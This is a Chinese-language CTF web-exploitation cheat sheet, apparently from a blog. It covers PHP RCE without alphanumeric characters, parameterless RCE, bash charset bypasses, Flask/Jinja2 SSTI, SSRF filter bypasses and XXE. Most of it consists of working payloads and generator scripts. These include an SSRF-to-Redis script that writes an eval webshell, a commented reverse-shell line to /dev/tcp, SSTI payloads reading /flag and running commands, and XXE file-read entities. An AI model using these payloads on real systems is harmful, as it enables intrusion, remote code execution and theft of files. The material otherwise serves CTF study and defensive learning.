![](https://img-blog.csdnimg.cn/20200410212200713.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
利用：`?code=(~%9E%8C%8C%9A%8D%8B)(~%D7%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%8F%9E%8C%8C%A2%D6%D6)`

Ascii码大于 0x7F 的字符都会被当作字符串，而和 0xFF 异或相当于取反，可以绕过被过滤的取反符号，即：
![](https://img-blog.csdnimg.cn/20200411130214538.png)
构造脚本：
```python
str_= '_GET'
str_=list(str_)
final=''
for x in str_:
    print(hex(~ord(x)&0xff))
    final+=hex(~ord(x)&0xff)
print(str_)
final = final.replace('0x','%')
final+='^'
for x in range(len(str_)):
    final+=r'%ff'
print(final)
```
```php
${%ff%ff%ff%ff^%a0%b8%ba%ab}{%ff}();&%ff=phpinfo
${%fe%fe%fe%fe^%a1%b9%bb%aa}[_](${%fe%fe%fe%fe^%a1%b9%bb%aa}[__]);&_=assert&__=eval($_POST['a'])
```

在这张图表上，'@'|'(任何左侧符号)'=='(右侧小写字母)'
![](https://img-blog.csdnimg.cn/2020080722072453.png)
即`'@'|'!'=='a' `，那么 `('@@@@'|'().4')=='hint'`
最后`?code=($_ = '@@@@'|'().4') == 1?1:$$_`
[wh1sper：CTFshow 36D杯](http://wh1sper.cn/ctfshow-36d%E6%9D%AF/)
![](https://img-blog.csdnimg.cn/20200829132052613.png)
![](https://img-blog.csdnimg.cn/20200829132322511.png)

[2020安恒DASCTF八月浪漫七夕战 ezrce Writeup](https://rce.moe/2020/08/25/GeekPwn-2020-%E4%BA%91%E4%B8%8A%E6%8C%91%E6%88%98%E8%B5%9B-cosplay-writeup/)
构造脚本：
```python
a = '$_{'
b = '}.'
c = '!!_'
 
x = input()
re = ""
shit = ['a','b','c','d','e','f','g','h','i','j','k','m','n','l','o','p','q','r','s','t','u','v','w','x','y','z','@','~','^','[',']','&','?','<','>','*','1','2','3','4','5','6','7','8','9','0']
for i in x:
	re += a
	num = shit.index(i)
	for j in range(num):
		re += c
		if j < num-1:
			re+='+'
	re += b
	
print(re)
```
payload：
```php
code=$_{!!_});$__=$_{!!_+!!_+!!_+!!_+!!_+!!_+!!_+!!_+!!_+!!_+!!_+!!_+!!_+!!_+!!_}.$_{!!_+!!_+!!_+!!_+!!_+!!_+!!_}.$_{!!_+!!_+!!_+!!_+!!_+!!_+!!_+!!_+!!_+!!_+!!_+!!_+!!_+!!_+!!_}.$_{!!_+!!_+!!_+!!_+!!_+!!_+!!_+!!_}.$_{!!_+!!_+!!_+!!_+!!_+!!_+!!_+!!_+!!_+!!_+!!_+!!_}.$_{!!_+!!_+!!_+!!_+!!_}.$_{!!_+!!_+!!_+!!_+!!_+!!_+!!_+!!_+!!_+!!_+!!_+!!_+!!_+!!_};$__();//
```
![](https://img-blog.csdnimg.cn/20200914232341674.png)

想到了无字母数字getshell的点，因为过滤了~^,就不能用取反和异或来进行getshell。想到的方法是递增。。。但是递增需要分号，需要绕过分号，来进行getshell，测试发现可以利用`<?=?>`来进行绕过
递增的代码 相当于`system($_POST[_]);`：
```php
<?=$_=[]?>
<?=$_="$_"?>
<?=$_=$_['!'=='@']?>
<?=$___=$_?>
<?=$__=$_?>
<?=$__++?><?=$__++?>
<?=$__++?><?=$__++?>
<?=$____=$__++?>
<?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$_____________=$__++?><?=$__++?>
<?=$__________=$__++?>
<?=$_________=$__++?>
<?=$__++?>
<?=$________=$__++?>
<?=$_____=$__++?>
<?=$______=$__++?>
<?=$______?>
<?=$__++?><?=$__++?><?=$__++?><?=$__++?>
<?=$____________=$__++?>
<?=$_____.$____________.$_____.$______.$____.$_____________?>
<?=$________________=$_____.$____________.$_____.$______.$____.$_____________?>
<?=$_________.$__________.$_____.$______?>
<?=($________________)(${'_'.$_________.$__________.$_____.$______}[_])?>
```
还可以：
```php
<?php $_=[];$_=@"$_";$_=$_["!"=="@"];$__=$_;$__++;$__++;$__++;$__++;$___.=$__;$__++;$__++;$____="_";$____.=$__;$____.=$___;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$_=$$____;$_[_]($_[__]);
```
构造的是`$_GET[_]($_GET[__])`木马
[De1CTF2020部分writeup ](https://www.anquanke.com/post/id/204345)

[php 不用字母，数字和下划线写 shell](https://mp.weixin.qq.com/s/fCxs4hAVpa-sF4tdT_W8-w)
[一些不包含数字和字母的webshell](https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html)
[无字母数字webshell之提高篇](https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html)
[无字母数字webshell总结](https://xz.aliyun.com/t/8107)
#### 利用PHP的错误运算返回来构造字母
>1/0 返回 INF //0为除数
0/0 返回 NAN
((1/0).(0)){0}  / I
((0/0).(0)){1}  / A

然后利用位运算来构造其他字符，先尝试在已得到字符中进行`|(或)`运算或者`&`运算
```python
a = ['A','F','I','N']
for i in a:
    for j in a:
        print i,j,chr(ord(i)|ord(str(j)))
        print i,j,chr(ord(i)&ord(str(j)))
```
最后构造如下：
```php
(((((0/0).(0)){1}|((1).(0)){0})&(((1/0).(0)){2}|((0).(0)){0})).(((0/0).(0)){0}&((1/0).(0)){0}).((((0/0).(0)){1}|((1).(0)){0})&(((1/0).(0)){2}|((0).(0)){0})).(((1/0).(0)){0}).(((0/0).(0)){0}).(((1/0).(0)){2}).(((1/0).(0)){0}|((1/0).(0)){2}))()
//('phpinfo')()
((((0/0).(0)){1}|((1/0).(0)){2}).(((((0/0).(0)){1}|((1).(0)){0})|((4).(0)){0})&(((1/0).(0)){0}|((1/0).(0)){2})).(((((0/0).(0)){1}|((1).(0)){0})|((4).(0)){0})&(((1/0).(0)){2}|((0).(0)){0})).(((0/0).(0)){1}).((((0/0).(0)){0}&((1/0).(0)){0})|(((0/0).(0)){0}&((((0/0).(0)){1}|((1).(0)){0})|((4).(0)){0}))).((((0/0).(0)){0}&((1/0).(0)){0})|(((0/0).(0)){0}&((((0/0).(0)){1}|((1).(0)){0})|((4).(0)){0}))).(((0/0).(0)){0}&((1/0).(0)){0}).(((((0/0).(0)){1}|((1).(0)){0})|((4).(0)){0})&(((1/0).(0)){0}|((1/0).(0)){2})).(((0/0).(0)){1}).(((0/0).(0)){0}&((((0/0).(0)){1}|((1).(0)){0})|((4).(0)){0})).(((((0/0).(0)){1}|((1).(0)){0})|((4).(0)){0})&(((1/0).(0)){0}|((1/0).(0)){2})).((((0/0).(0)){1}|((2).(0)){0})&(((1/0).(0)){2}|((0).(0)){0})).(((0/0).(0)){1}|((2).(0)){0}))()
//('GEtALLHEADErs')()
((((0/0).(0)){1}|((2).(0)){0}).(((0/0).(0)){1}|((8).(0)){0}).(((0/0).(0)){1}|((2).(0)){0}).(((((0/0).(0)){1}|((1).(0)){0})|((4).(0)){0})&(((1/0).(0)){2}|((0).(0)){0})).(((((0/0).(0)){1}|((1).(0)){0})|((4).(0)){0})&(((1/0).(0)){0}|((1/0).(0)){2})).((((0/0).(0)){0}&((1/0).(0)){0})|(((((0/0).(0)){1}|((1).(0)){0})|((4).(0)){0})&(((1/0).(0)){0}|((1/0).(0)){2}))))()
// ('systEM')()
最终payload：
((((0/0).(0)){1}|((2).(0)){0}).(((0/0).(0)){1}|((8).(0)){0}).(((0/0).(0)){1}|((2).(0)){0}).(((((0/0).(0)){1}|((1).(0)){0})|((4).(0)){0})&(((1/0).(0)){2}|((0).(0)){0})).(((((0/0).(0)){1}|((1).(0)){0})|((4).(0)){0})&(((1/0).(0)){0}|((1/0).(0)){2})).((((0/0).(0)){0}&((1/0).(0)){0})|(((((0/0).(0)){1}|((1).(0)){0})|((4).(0)){0})&(((1/0).(0)){0}|((1/0).(0)){2}))))(((((0/0).(0)){1}|((1/0).(0)){2}).(((((0/0).(0)){1}|((1).(0)){0})|((4).(0)){0})&(((1/0).(0)){0}|((1/0).(0)){2})).(((((0/0).(0)){1}|((1).(0)){0})|((4).(0)){0})&(((1/0).(0)){2}|((0).(0)){0})).(((0/0).(0)){1}).((((0/0).(0)){0}&((1/0).(0)){0})|(((0/0).(0)){0}&((((0/0).(0)){1}|((1).(0)){0})|((4).(0)){0}))).((((0/0).(0)){0}&((1/0).(0)){0})|(((0/0).(0)){0}&((((0/0).(0)){1}|((1).(0)){0})|((4).(0)){0}))).(((0/0).(0)){0}&((1/0).(0)){0}).(((((0/0).(0)){1}|((1).(0)){0})|((4).(0)){0})&(((1/0).(0)){0}|((1/0).(0)){2})).(((0/0).(0)){1}).(((0/0).(0)){0}&((((0/0).(0)){1}|((1).(0)){0})|((4).(0)){0})).(((((0/0).(0)){1}|((1).(0)){0})|((4).(0)){0})&(((1/0).(0)){0}|((1/0).(0)){2})).((((0/0).(0)){1}|((2).(0)){0})&(((1/0).(0)){2}|((0).(0)){0})).(((0/0).(0)){1}|((2).(0)){0}))(){111})
//('systEM')(('GEtALLHEADErs')(){111})
```
记录的字符如下：
```php
q:  ((0/0).(0)){1}|((1).(0)){0}
A:  ((0/0).(0)){1}
v:  ((1/0).(0)){2}|((0).(0)){0}
p:  (((0/0).(0)){1}|((1).(0)){0})&(((1/0).(0)){2}|((0).(0)){0})
N:  ((0/0).(0)){0}
I:  ((1/0).(0)){0}
H:  ((0/0).(0)){0}&((1/0).(0)){0}
F:  ((1/0).(0)){2}
O:  ((1/0).(0)){0}|((1/0).(0)){2}
G:  ((0/0).(0)){1}|((1/0).(0)){2}
u:  (((0/0).(0)){1}|((1).(0)){0})|((4).(0)){0}
t:  ((((0/0).(0)){1}|((1).(0)){0})|((4).(0)){0})&(((1/0).(0)){2}|((0).(0)){0})
E:  ((((0/0).(0)){1}|((1).(0)){0})|((4).(0)){0})&(((1/0).(0)){0}|((1/0).(0)){2})
D:  ((0/0).(0)){0}&((((0/0).(0)){1}|((1).(0)){0})|((4).(0)){0})
L:  (((0/0).(0)){0}&((1/0).(0)){0})|(((0/0).(0)){0}&((((0/0).(0)){1}|((1).(0)){0})|((4).(0)){0}))
s:  ((0/0).(0)){1}|((2).(0)){0}
r:  (((0/0).(0)){1}|((2).(0)){0})&(((1/0).(0)){2}|((0).(0)){0})
y:  ((0/0).(0)){1}|((8).(0)){0}
x:  (((0/0).(0)){0}&((1/0).(0)){0})|((8).(0)){0}
C:  (((0/0).(0)){1}|((2).(0)){0})&(((0/0).(0)){1}|((1/0).(0)){2})
M:  (((0/0).(0)){0}&((1/0).(0)){0})|(((((0/0).(0)){1}|((1).(0)){0})|((4).(0)){0})&(((1/0).(0)){0}|((1/0).(0)){2}))
```
[RCTF2020-Web-calc](https://nop-sw.github.io/wiki/wp/RCTF/)

#### 无参数RCE
**法一：session_id()**
```php
<?php
echo bin2hex('phpinfo();');  //706870696e666f28293b
```
最后`eval(hex2bin(session_id(session_start())));`
Cookies:PHPSESSID=706870696e666f28293b
也可以`show_source(session_id(session_start()));`
设置cookie PHPSESSID=flag.php
```python
import requests
url = 'http://localhost/?code=eval(hex2bin(session_id(session_start())));'
payload = "echo 'sky cool';".encode('hex')
cookies = {
	'PHPSESSID':payload
}
r = requests.get(url=url,cookies=cookies)
print r.content
```
**法二：get_defined_vars()**
>get_defined_vars ( void ) : array 返回由所有已定义变量所组成的数组
此函数返回一个包含所有已定义变量列表的多维数组，这些变量包括环境变量、服务器变量和用户定义的变量。

`eval(end(current(get_defined_vars())));&b=phpinfo();`
师傅脚本：
```python
import requests
from io import BytesIO

payload = "system('ls /tmp');".encode('hex')
files = {
  payload: BytesIO('sky cool!')
}

r = requests.post('http://localhost/skyskysky.php?code=eval(hex2bin(array_rand(end(get_defined_vars()))));', files=files, allow_redirects=False)

print r.content
```
**法三：getallheaders()**
使用getallheaders()其实具有局限性，因为他是apache的函数
``eval(end(getallheaders()))``  利用HTTP最后的一个header传参
``eval(getallheaders(){'a'})``  利用HTTP名为a的header传参

取反利用：`(~%9E%8C%8C%9A%8D%8B)((~%91%9A%87%8B)((~%98%9A%8B%9E%93%93%97%9A%9E%9B%9A%8D%8C)()));`
![](https://img-blog.csdnimg.cn/20200819152626629.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70#pic_center)
即：`(assert)((next)((getallheaders)()));`

```php
system(end(getallheaders()));
//(~(%8c%86%8c%8b%9a%92))((~(%9a%91%9b))((~(%98%9a%8b%9e%93%93%97%9a%9e%9b%9a%8d%8c))()));
```
另一种利用：
```php
system(end(getallheaders()));
//[~%8c%86%8c%8b%9a%92]{!_}([~%9a%91%9b]{!_}([~%98%9a%8b%9e%93%93%97%9a%9e%9b%9a%8d%8c]{!_}()));
```
**法四：dirname() & chdir()**
利用getcwd() 获取当前目录
用scandir() 目录遍历
dirname() 目录上跳==>给出一个包含有指向一个文件的全路径的字符串，本函数返回去掉文件名后的目录名。
chdir() 更改当前目录
`readfile(next(array_reverse(scandir(dirname(chdir(dirname(getcwd())))))));`

[php无参数执行命令](http://www.pdsdt.lovepdsdt.com/index.php/2019/11/06/php_shell_no_code/)
[简析GXY_CTF “禁止套娃”无参数RCE](https://www.gem-love.com/ctf/530.html)
[[GXYCTF2019]禁止套娃](https://www.cnblogs.com/wangtanzhi/p/12260986.html)
[从一道CTF题学习Fuzz思想](https://xz.aliyun.com/t/6737)
[[原题复现]ByteCTF 2019 –WEB- Boring-Code[无参数rce、绕过filter_var(),等]](https://www.cnblogs.com/xhds/p/12881059.html)
[PHP Parametric Function RCE](https://skysec.top/2019/03/29/PHP-Parametric-Function-RCE/#%E4%BB%80%E4%B9%88%E6%98%AF%E6%97%A0%E5%8F%82%E6%95%B0%E5%87%BD%E6%95%B0RCE)
[浅谈无参数RCE](https://www.cnblogs.com/wangtanzhi/p/12311239.html)

#### Web-Bash(真tm难)
题目源码：
```php
<?php
highlight_file(__FILE__);
if(isset($_POST["cmd"]))
{
    $test = $_POST['cmd'];
    $white_list = str_split('${}#\\(<)\'0'); 
    $char_list = str_split($test);
    foreach($char_list as $c){
        if(!in_array($c,$white_list)){
                die("Cyzcc");
            }
        }
    echo $test;
    exec($test);
}
?>
```
只能包含以下字元：`$ ( ) # ! { } < \ '`
>1.`$#` => 0
`$#` 的意思是參數的個數，這題沒有其餘的參數所以會是 0
2.`$(($#<$$))` => 1
`$$` 代表的是目前的 pid ，pid 會 > 0 所以可以得到 1
3.`$((1<<1))` => 2
shift 運算，bj4
4.`$((2#bbb))` => 任意數字
將 bbb 以二進制轉換成數字
5.`<<<` 的用途是將任意字串交由前面的指令執行
6.bash 可以用 `$'\ooo'` 的形式來表達任意字元（ooo 是字元轉 ascii 的八進制）

推薦超詳細的 bash 文件：[Advanced Bash-Scripting Guide](https://tldp.org/LDP/abs/html/abs-guide.html)
可以利用八进制的方法绕过一些ban了字母的题：`$'\154\163'`
![](/bmth_blog/images/pasted-218.png)
可以利用位运算和进制转换的方法利用符号构造数字，本题中直接给出0简化了一些操作：
![](/bmth_blog/images/pasted-219.png)

转换成数字之后就需要用到`<<<`来重定向了，但是一层不够，只用一层会出现`bash: $'\154\163': command not found`这样的报错，得知bash一次解析只能解析到成数字，需要第二次解析，需要给原先的命令添加转义字符

```python
import requests
n = dict()
n[0] = '0'
n[1] = '${##}'    #${##}计算#这个字符的长度为1，这里如果没有屏蔽!的话还可以用$((!$#))
n[2] = '$((${##}<<${##}))'    #通过位运算得到2
n[3] = '$(($((${##}<<${##}))#${##}${##}))'    #通过二进制11转换为十进制得到3,4,5,6,7
n[4] = '$((${##}<<$((${##}<<${##}))))'
n[5] = '$(($((${##}<<${##}))#${##}0${##}))'
n[6] = '$(($((${##}<<${##}))#${##}${##}0))'
n[7] = '$(($((${##}<<${##}))#${##}${##}${##}))'

f=''

def str_to_oct(cmd):       #命令转换成八进制字符串
	s = ""
	for t in cmd:
		o = ('%s' % (oct(ord(t))))[2:]
		s+='\\'+o
	return s
    
def build(cmd):       #八进制字符串转换成字符
	payload = "$0<<<$0\<\<\<\$\\\'"
	s = str_to_oct(cmd).split('\\')
	for _ in s[1:]:
		payload+="\\\\"
		for i in _:
			payload+=n[int(i)]
	return payload+'\\\''
    
def get_flag(url,payload):       #盲注函数
	try:
		data = {'cmd':payload}
		r = requests.post(url,data,timeout=1.5)
	except:
		return True
	return False
    
#弹shell
#print(build('bash -i >& /dev/tcp/your-ip/2333 0>&1'))

#盲注
# a='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890_{}@'
# for i in range(1,50):
#	 for j in a:
#		 cmd=f'cat /flag|grep ^{f+j}&&sleep 3'
#		 url = "http://ip/"
#		 if get_flag(url,build(cmd)):
#			 break
#	 f = f+j
#	 print(f)
```

参考文章：
[安洵杯部分WP](https://www.anquanke.com/post/id/223786)
[34C3 CTF: minbashmaxfun](https://hack.more.systems/writeup/2017/12/30/34c3ctf-minbashmaxfun/)
[34C3CTF 2017 MISC 162 minbashmaxfun](https://ddaa.tw/34c3ctf_2017_misc_162_minbashmaxfun.html)
### 模板注入
[https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection)
**类继承：**

python中对一个变量应用class方法从一个变量实例转到对应的对象类型后，类有以下三种关于继承关系的方法

>\_\_base__ //对象的一个基类，一般情况下是object，有时不是，这时需要使用下一个方法
\_\_mro__ //同样可以获取对象的基类，只是这时会显示出整个继承链的关系，是一个列表，object在最底层故在列表中的最后，通过__mro__[-1]可以获取到
\_\_subclasses__() //继承此对象的子类，返回一个列表

**魔术函数：**

这里介绍几个常见的魔术函数，有助于后续的理解

>`__dict__`类的静态函数、类函数、普通函数、全局变量以及一些内置的属性都是放在类的`__dict__`里的对象的`__dict__`中存储了一些self.xxx的一些东西内置的数据类型没有`__dict__`属性每个类有自己的`__dict__`属性，就算存在继承关系，父类的`__dict__` 并不会影响子类的`__dict__`对象也有自己的`__dict__`属性， 存储self.xxx 信息，父子类对象公用`__dict__`
>`__globals__`该属性是函数特有的属性,记录当前文件全局变量的值,如果某个文件调用了os、sys等库,但我们只能访问该文件某个函数或者某个对象，那么我们就可以利用**globals**属性访问全局的变量。该属性保存的是函数全局变量的字典引用。
>`__getattribute__()`实例、类、函数都具有的`__getattribute__`魔术方法。事实上，在实例化的对象进行.操作的时候（形如：`a.xxx/a.xxx()`），都会自动去调用`__getattribute__`方法。因此我们同样可以直接通过这个方法来获取到实例、类、函数的属性。


[服务端模板注入攻击](https://zhuanlan.zhihu.com/p/28823933)
[SSTI/沙盒逃逸详细总结](https://www.anquanke.com/post/id/188172)
[SSTI模板注入](https://www.jianshu.com/p/aef2ae0498df)
[一篇文章带你理解漏洞之 SSTI 漏洞](https://www.k0rz3n.com/2018/11/12/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E7%90%86%E8%A7%A3%E6%BC%8F%E6%B4%9E%E4%B9%8BSSTI%E6%BC%8F%E6%B4%9E)
[python 模板注入](https://www.cnblogs.com/tr1ple/p/9415641.html)
[浅析SSTI(python沙盒绕过)](https://bbs.ichunqiu.com/thread-47685-1-1.html?from=aqzx8)
[Python 沙盒绕过 ](https://bestwing.me/awesome-python-sandbox-in-ciscn.html)
[利用Python字符串格式化特性绕过ssti过滤](https://xz.aliyun.com/t/7519)
[Python沙箱逃逸的n种姿势](https://xz.aliyun.com/t/52)
#### Flask/Jinja2
字符串拼接(思路)：
```python
{{''.__class__.__bases__[0].__subclasses__()[75].__init__.__globals__['__builtins__']['__imp'+'ort__']('o'+'s').listdir('/')}}
{{''.__class__.__base__.__subclasses__()[131].__init__.__globals__['__builtins__']['ev'+'al']('__im'+'port__("o'+'s").po'+'pen("cat /this_is_the_fl'+'ag.txt")').read()}}
或者
{{''.__class__.__base__.__subclasses__()[77].__init__.__globals__['sys'].modules['o'+'s'].__dict__['po'+'pen']('cat /this_is_the_fl'+'ag.txt').read()}}
{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].open('txt.galf_eht_si_siht/'[::-1],'r').read() }}{% endif %}{% endfor %}
{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].open('/this_is_the_fl'+'ag.txt','r').read()}}{% endif %}{% endfor %}

{{().__class__.__bases__[0].__subclasses__()[177].__init__.__globals__.__builtins__['open']('cat /fl4g|base64').read()}}
{{session['__cla'+'ss__'].__bases__[0].__bases__[0].__bases__[0].__bases__[0]['__subcla'+'sses__']()[40]('/flag').read() }}
{{session.__init__.__globals__["__bui""ltins__")].open("/fl".__add__("ag")).read()}}
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('cat /flag')|attr('read')()}}
```
原型payload：
```python
''.__class__.__mro__[1].__subclasses__()[104].__init__.__globals__["sys"].modules["os"].system("ls")
```
bypass waf变种payload:
```python
getattr(getattr(getattr(getattr(getattr(getattr(getattr([],'__cla'+'ss__'),'__mr'+'o__')[1],'__subclas'+'ses__')()[104],'__init__'),'__glob'+'al'+'s__')['sy'+'s'],'mod'+'ules')['o'+'s'],'sy'+'ste'+'m')('l'+'s')
```

**python3 payload:**

```python
#命令执行：
{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].eval("__import__('os').popen('id').read()") }}{% endif %}{% endfor %}
#文件操作
{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].open('filename', 'r').read() }}{% endif %}{% endfor %}

().__class__.__bases__[0].__subclasses__()[-4].__init__.__globals__['system']('ls')

().__class__.__bases__[0].__subclasses__()[93].__init__.__globals__["sys"].modules["os"].system("ls")

''.__class__.__mro__[1].__subclasses__()[104].__init__.__globals__["sys"].modules["os"].system("ls")

[].__class__.__base__.__subclasses__()[127].__init__.__globals__['system']('ls')
```
新颖的绕过思路：
```python
//8进制绕过
print(a|attr("\137\137\151\156\151\164\137\137")|attr("\137\137\147\154\157\142\141\154\163\137\137")|attr("\137\137\147\145\164\151\164\145\155\137\137")("\137\137\142\165\151\154\164\151\156\163\137\137")|attr("\137\137\147\145\164\151\164\145\155\137\137")("\145\166\141\154")("\137\137\151\155\160\157\162\164\137\137\50\47\157\163\47\51\56\160\157\160\145\156\50\47\143\141\164\40\57\146\154\141\147\47\51\56\162\145\141\144\50\51"))
print(()["\137\137\143\154\141\163\163\137\137"]["\137\137\142\141\163\145\137\137"]["\137\137\163\165\142\143\154\141\163\163\145\163\137\137"]()[95]["\137\137\151\156\151\164\137\137"]["\137\137\147\154\157\142\141\154\163\137\137"]["\137\137\142\165\151\154\164\151\156\163\137\137"]["\137\137\151\155\160\157\162\164\137\137"]("o""s")["\160\157\160\145\156"]("ls")["\162\145\141\144"]())

//unicode绕过
print(lipsum|attr(%22\u005f\u005f\u0067\u006c\u006f\u0062\u0061\u006c\u0073\u005f\u005f%22))|attr(%22\u005f\u005f\u0067\u0065\u0074\u0069\u0074\u0065\u006d\u005f\u005f%22)(%22os%22)|attr(%22popen%22)(%22whoami%22)|attr(%22read%22)()
//使用get传参
?guess={{ ({}|attr(request.args.x1)|attr(request.args.x2)|attr(request.args.x3)())}}
&x1=__class__
&x2=__base__
&x3=__subclasses__
?guess={{ ({}|attr(request.args.x1)|attr(request.args.x2)|attr(request.args.x3)())|attr(request.args.x6)(165)|attr(request.args.x4)|attr(request.args.x5)|attr(request.args.x6)(request.args.x7)|attr(request.args.x6)(request.args.x8)(request.args.x9)}}
&x1=__class__
&x2=__base__
&x3=__subclasses__
&x4=__init__
&x5=__globals__
&x6=__getitem__
&x7=__builtins__
&x8=eval
&x9=__import__("os").popen("ls").read()
```
过滤了`[]、_、args、单双引号、不允许POST`还可以使用request.cookies

过滤了数字，可以使用特殊的数字来绕过[https://www.compart.com/en/unicode/bidiclass/EN](https://www.compart.com/en/unicode/bidiclass/EN)
![](https://img-blog.csdnimg.cn/2021032916462523.png)
然后就可以使用`join`进行拼接构造字符
![](https://img-blog.csdnimg.cn/20210329165145303.png)

[安恒月赛DASCTF三月娱乐赛 ](http://www.plasf.cn/articles/dasctf202103.html)
[XCTF高校网络安全专题挑战赛-华为云专场部分WP ](https://mp.weixin.qq.com/s/fkiFV7u3QjDsfHDcdwl6iA)
[0RAYS-安洵杯writeup ](https://www.anquanke.com/post/id/223895)
可参考文章：
[SSTI模板注入绕过（进阶篇）](https://blog.csdn.net/miuzzx/article/details/110220425)
[SSTI模板注入及绕过姿势(基于Python-Jinja2)](https://blog.csdn.net/solitudi/article/details/107752717)
[探索Flask/Jinja2中的服务端模版注入（一）](https://www.freebuf.com/articles/web/98619.html)
[探索Flask/Jinja2中的服务端模版注入（二）](https://www.freebuf.com/articles/web/98928.html)
[FLASK/JINJA2 SSTI入门](https://ccdragon.cc/?p=370)
[Server-Side Template Injection](https://portswigger.net/research/server-side-template-injection)
[从零学习flask模板注入](https://www.freebuf.com/column/187845.html)
[Flask/Jinja2模板注入中的一些绕过姿势 ](https://p0sec.net/index.php/archives/120/)
### SSRF
**绕过ip检测：**
1. 使用http://example.com@evil.com
2. IP地址转为进制，以及IP地址省略写法：

```bash
http://localhost
http://[::] >>> http://127.0.0.1
0177.00.00.01(八进制)
2130706433(十进制)
0x7f.0x0.0x0.0x1(十六进制)
127.1(IP地址省略写法)
```

3. curl可以用句号(。)代替点(.)
4. `enclosed alphanumerics`代替ip中的数字或者网址中的字母
[Unicode Characters in the Enclosed Alphanumerics Block](http://www.fileformat.info/info/unicode/block/enclosed_alphanumerics/images.htm)
5. windows下，0代表0.0.0.0，而在linux下，0代表127.0.0.1，`http://0`进行请求127.0.0.1，也可以将0省略`127.1`

[SSRF漏洞中绕过IP限制的几种方法总结](https://www.freebuf.com/articles/web/135342.html)

**有strpos的限制（利用%2570绕过）**
>如果向strpos传入一个双重url编码的字符串，可以达到绕过的目的
比如我们这里可以使x=%2570，就可以绕过strpos($x,"php")
(%25是%的url编码,%70是p的url编码)
即：http://127.0.0.1/?x=file:///var/www/html/index.ph%2570

**curl函数**
```php
<?php
	echo "<!-- /?url= -->";
	if ($_GET['url']) {
	if (preg_match("/flag/i", $_GET['url'])) {
	die();
	}
	$curl = curl_init();
	
	curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
	curl_setopt($curl, CURLOPT_TIMEOUT, 500);
	curl_setopt($curl, CURLOPT_URL, $_GET['url']);
	
	$res = curl_exec($curl);
	curl_close($curl);
	echo $res;
}
```
因使用了curl函数，curl会在处理请求的时候再进行一次urldecode。故构造payload时二次urlencode即可绕过
`file:///%2566%256c%2561%2567`

SSRF打redis：
```python
#!/usr/bin/env python3
#-*- coding:utf-8 -*-
#__author__: 颖奇L'Amore www.gem-love.com

import requests as req 

url = "http://eci-2zebigmdhrm1h25i2qcw.cloudeci1.ichunqiu.com/"

def g_redis(s, num):
	res = ''
	for i in s:
		res += f"%{'%02x' % ord(i)}"
	if num > 0:
		return g_redis(res, num-1)
	else:
		return res

payload = "\r\n".join(["","set a '<?php eval($_POST[Y1ng]); ?>'","config set dir /var/www/html","config set dbfilename y1ng.php","save","test"])
req.get(url=url+"?url=http://@127.0.0.1:5000@www.baidu.com/?url=http://127.0.0.1:6379?"+g_redis(payload, 1))
```
[2020祥云杯Writeup](https://www.gem-love.com/ctf/2676.html)

参考文章：
[服务端请求伪造（SSRF）之Redis篇](https://www.freebuf.com/sectool/242692.html)
[一次“SSRF-->RCE”的艰难利用 ](https://mp.weixin.qq.com/s/kfYF157ux_VAOymU5l5RFA)
[工具：Gopherus](https://github.com/tarunkant/Gopherus)
[浅谈SSRF 加redis反弹shell](https://blog.csdn.net/god_zzZ/article/details/105023855)
[Redis和SSRF](https://xz.aliyun.com/t/1800)
[Gopher协议在SSRF漏洞中的深入研究（附视频讲解）](https://zhuanlan.zhihu.com/p/112055947)
[SSRF in PHP](https://joychou.org/web/phpssrf.html)
[了解SSRF,这一篇就足够了](https://xz.aliyun.com/t/2115#toc-0)
[学习笔记-SSRF基础](https://www.jianshu.com/p/095f233cc9d5)
[SSRF学习之路](https://www.freebuf.com/column/157466.html)
[SSRF技巧之如何绕过filter_var( )](https://www.anquanke.com/post/id/101058)
[SSRF绕过方法总结](https://mp.weixin.qq.com/s/FSUWQ3qizAKwpA5cTACFng)
### XML,XXE
安装expect扩展的PHP环境里执行系统命令，其他协议也有可能可以执行系统命令。
```xml
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE xxe [
<!ELEMENT name ANY >
<!ENTITY xxe SYSTEM "expect://id" >]>
<root>
<name>&xxe;</name>
</root>
```
外部实体 (libxml < 2.90)
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "file:///flag">
]>
<userInfo>
<name>&xxe;</name>
</userInfo>
```
[一篇文章带你深入理解漏洞之 XXE 漏洞](https://xz.aliyun.com/t/3357)
[从XML相关一步一步到XXE漏洞](https://xz.aliyun.com/t/6887)
[XXE漏洞利用技巧：从XML到远程代码执行](https://www.freebuf.com/articles/web/177979.html)

### XSS
